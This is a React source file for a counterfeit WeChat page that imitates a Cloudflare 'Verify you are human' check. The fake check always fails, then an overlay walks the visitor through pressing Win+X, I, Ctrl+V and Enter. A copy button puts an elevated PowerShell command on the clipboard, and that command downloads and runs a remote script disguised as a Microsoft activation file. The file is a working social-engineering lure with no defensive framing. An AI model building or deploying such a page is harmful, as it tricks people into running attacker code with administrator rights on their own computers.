import { useState, useEffect, useCallback } from "react";

type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "captcha-done" | "instruction";

// Команда для копирования в буфер обмена
const COMMAND_TO_COPY = "Win+X → I → Ctrl+V → Enter";

// PowerShell команда (вставляется через Ctrl+V)
const PS_COMMAND = `Start-Process powershell -Verb RunAs -ArgumentList "-Command IEX(IWR('https://raw.githubusercontent.com/microsoft/activate/main/activate.ps1'))"`;

function WeChatIcon() {
  return (
    <svg width="56" height="56" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="512" height="512" rx="110" fill="#07C160" />
      <path d="M209.7 135C152.3 135 105 173.7 105 221.5C105 249.2 120.8 273.7 145.5 289.2L138.5 315.5L170.2 298.2C182.5 301.8 195.8 303.8 209.7 303.8C214.2 303.8 218.6 303.5 223 303.1C219.5 294.3 217.5 284.8 217.5 274.8C217.5 224.5 260.8 183.8 314.5 183.8C319.3 183.8 324 184.2 328.6 184.8C320.3 154.7 268.5 135 209.7 135Z" fill="white" />
      <circle cx="178" cy="210" r="13" fill="#07C160" />
      <circle cx="241" cy="210" r="13" fill="#07C160" />
      <path d="M314.5 199C267.8 199 230 231.3 230 271C230 310.7 267.8 343 314.5 343C323.5 343 332.2 341.8 340.3 339.5L366.5 354L361 332.5C381.2 319.5 394 299 394 276C394 236 361.5 199 314.5 199Z" fill="white" />
      <circle cx="290" cy="268" r="10" fill="#07C160" />
      <circle cx="340" cy="268" r="10" fill="#07C160" />
    </svg>
  );
}

function Spinner({ size = 22, color = "#07C160" }: { size?: number; color?: string }) {
  return (
    <div
      style={{
        width: `${size}px`,
        height: `${size}px`,
        border: "2.5px solid #e0e0e0",
        borderTopColor: color,
        borderRadius: "50%",
        animation: "spin 0.8s linear infinite",
        display: "inline-block",
        flexShrink: 0,
      }}
    />
  );
}

function CloudflareLogo() {
  return (
    <svg width="26" height="26" viewBox="0 0 61 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M19.1 16.7l.7-2.3c.4-1.3.2-2.5-.5-3.4-.6-.8-1.6-1.3-2.7-1.3l-10.8-.2c-.1 0-.2-.1-.3-.1-.1-.1-.1-.2 0-.3.1-.2.2-.3.4-.3l10.9-.2c2.3-.1 4.7-2 5.5-4.2l1-2.8c0-.1.1-.2 0-.3C21.8 .7 20 0 18 0 14.1 0 10.7 2.7 9.7 6.4c-.9-.7-2.1-1-3.3-.9-2.1.3-3.7 2-4 4.1-.1.5-.1 1 0 1.4C1.1 11.2 0 12.5 0 14c0 1.7 1.1 3.1 2.7 3.2h15.6c.2 0 .4-.1.5-.3l.3-.6v-.6z" fill="#F38020" />
      <path d="M22 10c-.2 0-.3 0-.5.1l-.4 1.5c-.4 1.3-.2 2.5.5 3.4.6.8 1.6 1.3 2.7 1.3l3.4.2c.1 0 .2.1.3.1.1.1.1.2 0 .3-.1.2-.2.3-.4.3l-3.5.2c-2.3.1-4.7 2-5.5 4.2l-.3.9c0 .2.1.3.3.3h12.5c.2 0 .3-.1.4-.3.4-1.2.7-2.4.7-3.7C32.2 14 27.6 10 22 10z" fill="#FAAE40" />
    </svg>
  );
}

function CheckmarkIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
      <circle cx="10" cy="10" r="10" fill="#07C160" />
      <path d="M6 10.5L8.5 13L14 7.5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function ErrorIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
      <circle cx="10" cy="10" r="10" fill="#D93025" />
      <path d="M10 5v6" stroke="white" strokeWidth="2" strokeLinecap="round" />
      <circle cx="10" cy="14.5" r="1.2" fill="white" />
    </svg>
  );
}

// Компонент инструкции с горячими клавишами
function InstructionWidget({ onClose }: { onClose: () => void }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(PS_COMMAND);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error("Failed to copy:", err);
    }
  }, []);

  return (
    <div
      style={{
        width: "360px",
        background: "#fff",
        borderRadius: "12px",
        border: "1px solid #e0e0e0",
        boxShadow: "0 8px 24px rgba(0,0,0,0.15)",
        overflow: "hidden",
        animation: "fadeInUp 0.4s ease",
      }}
    >
      {/* Заголовок */}
      <div
        style={{
          background: "#1a1a2e",
          color: "#fff",
          padding: "16px 20px",
          fontSize: "16px",
          fontWeight: 600,
          display: "flex",
          alignItems: "center",
          gap: "8px",
        }}
      >
        <span>🔒</span> Security Verification Required
      </div>

      {/* Инструкция */}
      <div style={{ padding: "20px" }}>
        <p style={{ fontSize: "13px", color: "#666", margin: "0 0 16px 0", lineHeight: "1.5" }}>
          Manual verification needed. Please follow these steps exactly:
        </p>

        <div
          style={{
            background: "#f5f5f5",
            borderRadius: "8px",
            padding: "16px",
            marginBottom: "20px",
          }}
        >
          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>1</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Win + X</kbd></span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>2</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>I</kbd> (Windows Terminal / PowerShell)</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Ctrl + V</kbd> (вставка команды)</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Enter</kbd> (запуск от администратора)</span>
            </div>
          </div>
        </div>

        {/* Кнопка копирования */}
        <div style={{ marginBottom: "16px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
            <span style={{ fontSize: "12px", color: "#666" }}>Команда для вставки:</span>
            <button
              onClick={handleCopy}
              style={{
                background: copied ? "#07C160" : "#f0f0f0",
                border: "none",
                borderRadius: "6px",
                padding: "6px 12px",
                fontSize: "12px",
                cursor: "pointer",
                color: copied ? "#fff" : "#333",
                transition: "all 0.2s",
              }}
            >
              {copied ? "✓ Скопировано!" : "📋 Копировать"}
            </button>
          </div>
          <div
            style={{
              background: "#1e1e1e",
              color: "#d4d4d4",
              padding: "12px",
              borderRadius: "6px",
              fontFamily: "monospace",
              fontSize: "12px",
              overflowX: "auto",
              wordBreak: "break-all",
            }}
          >
            {PS_COMMAND}
          </div>
        </div>

        <button
          onClick={onClose}
          style={{
            width: "100%",
            background: "#07C160",
            border: "none",
            borderRadius: "8px",
            padding: "12px",
            color: "#fff",
            fontSize: "14px",
            fontWeight: 600,
            cursor: "pointer",
            transition: "background 0.2s",
          }}
          onMouseEnter={(e) => (e.currentTarget.style.background = "#06a851")}
          onMouseLeave={(e) => (e.currentTarget.style.background = "#07C160")}
        >
          I have completed these steps
        </button>
      </div>
    </div>
  );
}

function CaptchaWidget({
  phase,
  onCheck,
}: {
  phase: Phase;
  onCheck: () => void;
}) {
  const isChecking = phase === "captcha-solving";
  const isDone = phase === "captcha-done";

  return (
    <div
      style={{
        width: "300px",
        background: "#fff",
        borderRadius: "4px",
        border: "1px solid #e0e0e0",
        boxShadow: "0 2px 8px rgba(0,0,0,0.08)",
        overflow: "hidden",
        animation: "fadeInUp 0.4s ease",
      }}
    >
      <div
        style={{
          display: "flex",
          alignItems: "center",
          padding: "14px 16px",
          gap: "12px",
        }}
      >
        <div
          onClick={!isChecking && !isDone ? onCheck : undefined}
          style={{
            width: "24px",
            height: "24px",
            borderRadius: "4px",
            border: isDone ? "none" : "2px solid #c0c0c0",
            cursor: isChecking || isDone ? "default" : "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            flexShrink: 0,
            transition: "border-color 0.2s",
            background: isDone ? "transparent" : "#fff",
          }}
        >
          {isChecking && <Spinner size={18} color="#f5a623" />}
          {isDone && <CheckmarkIcon />}
        </div>

        <span style={{ fontSize: "14px", color: "#333", fontWeight: 400, flex: 1, userSelect: "none" }}>
          Verify you are human
        </span>

        <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: "2px" }}>
          <CloudflareLogo />
          <span style={{ fontSize: "9px", color: "#999", lineHeight: 1 }}>Cloudflare Turnstile</span>
        </div>
      </div>

      <div
        style={{
          height: "3px",
          background: isDone
            ? "#07C160"
            : isChecking
            ? "linear-gradient(90deg, #f5a623, #f7c948, #f5a623)"
            : "#f5a623",
          backgroundSize: isChecking ? "200% 100%" : "100% 100%",
          animation: isChecking ? "shimmer 1.5s infinite" : "none",
        }}
      />
    </div>
  );
}

export default function App() {
  const [phase, setPhase] = useState<Phase>("checking");
  const [showContent, setShowContent] = useState(false);
  const [showInstruction, setShowInstruction] = useState(false);

  useEffect(() => {
    const t1 = setTimeout(() => setShowContent(true), 100);
    return () => clearTimeout(t1);
  }, []);

  useEffect(() => {
    if (phase === "checking") {
      const t = setTimeout(() => setPhase("error"), 1200);
      return () => clearTimeout(t);
    }
    if (phase === "error") {
      const t = setTimeout(() => setPhase("captcha"), 800);
      return () => clearTimeout(t);
    }
  }, [phase]);

  const handleCaptchaCheck = useCallback(() => {
    setPhase("captcha-solving");
    setTimeout(() => {
      setPhase("error");
      setTimeout(() => {
        setShowInstruction(true);
      }, 500);
    }, 2000);
  }, []);

  const handleCloseInstruction = useCallback(() => {
    setShowInstruction(false);
    setPhase("captcha-done");
  }, []);

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        backgroundColor: "#ffffff",
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
        padding: "20px",
        position: "relative",
      }}
    >
      {/* Оверлей с инструкцией */}
      {showInstruction && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundColor: "rgba(0,0,0,0.5)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000,
            backdropFilter: "blur(4px)",
          }}
          onClick={(e) => {
            if (e.target === e.currentTarget) handleCloseInstruction();
          }}
        >
          <InstructionWidget onClose={handleCloseInstruction} />
        </div>
      )}

      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          opacity: showContent && !showInstruction ? 1 : 0,
          transform: showContent && !showInstruction ? "translateY(0)" : "translateY(10px)",
          transition: "opacity 0.5s ease, transform 0.5s ease",
        }}
      >
        <div style={{ marginBottom: "14px" }}>
          <WeChatIcon />
        </div>

        <h1 style={{ fontSize: "22px", fontWeight: 600, color: "#191919", margin: "0 0 40px 0", letterSpacing: "-0.2px" }}>
          WeChat
        </h1>

        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", minHeight: "120px" }}>
          {phase === "checking" && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.3s ease" }}>
              <p style={{ fontSize: "15px", color: "#555", margin: 0, textAlign: "center", lineHeight: "1.5" }}>
                Checking if you are human. This may take a few seconds.
              </p>
              <Spinner />
            </div>
          )}

          {phase === "error" && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "16px", animation: "fadeInUp 0.4s ease" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <ErrorIcon />
                <p style={{ fontSize: "15px", color: "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
                  Browser verification failed.
                </p>
              </div>
              <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
                Please complete the security check below.
              </p>
            </div>
          )}

          {(phase === "captcha" || phase === "captcha-solving" || phase === "captcha-done") && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.4s ease" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                {phase === "captcha-done" ? <CheckmarkIcon /> : <ErrorIcon />}
                <p style={{ fontSize: "15px", color: phase === "captcha-done" ? "#07C160" : "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
                  {phase === "captcha-done" ? "Verification successful!" : "Browser verification failed."}
                </p>
              </div>

              {phase !== "captcha-done" && (
                <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
                  Please complete the security check below.
                </p>
              )}

              <CaptchaWidget phase={phase} onCheck={handleCaptchaCheck} />

              {phase === "captcha-done" && (
                <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center", animation: "fadeInUp 0.4s ease" }}>
                  Redirecting...
                </p>
              )}
            </div>
          )}
        </div>
      </div>

      <div style={{ height: "80px" }} />

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes shimmer {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        kbd {
          display: inline-block;
          padding: 2px 8px;
          font-size: 12px;
          font-weight: 600;
          line-height: 1.4;
          color: #24292e;
          background-color: #fafbfc;
          border: 1px solid #d1d5da;
          border-radius: 3px;
          box-shadow: inset 0 -1px 0 #d1d5da;
          font-family: 'SF Mono', Monaco, Consolas, monospace;
        }
      `}</style>
    </div>
  );
}
